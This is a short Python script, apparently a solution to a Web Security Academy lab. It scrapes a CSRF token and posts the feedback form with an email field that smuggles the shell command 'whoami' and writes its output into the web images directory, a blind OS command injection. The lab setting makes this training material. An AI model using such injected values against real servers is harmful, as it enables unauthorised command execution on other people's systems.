import requests
from bs4 import BeautifulSoup

if __name__ == "__main__":
    s = requests.Session()
    site = 'https://acb01fe21f92867cc07d12f3004300a7.web-security-academy.net'
    feedback_url = f'{site}/feedback'
    resp = s.get(feedback_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    feedback_submit_url = f'{site}/feedback/submit'
    post_data = {
        'csrf': csrf,
        'name': 'x',
        'email': 'x@x.com|| whoami > /var/www/images/output.txt ||',
        'subject': 'x',
        'message': 'x'
    }
    resp = s.post(feedback_submit_url, data=post_data)
    print(resp.text)
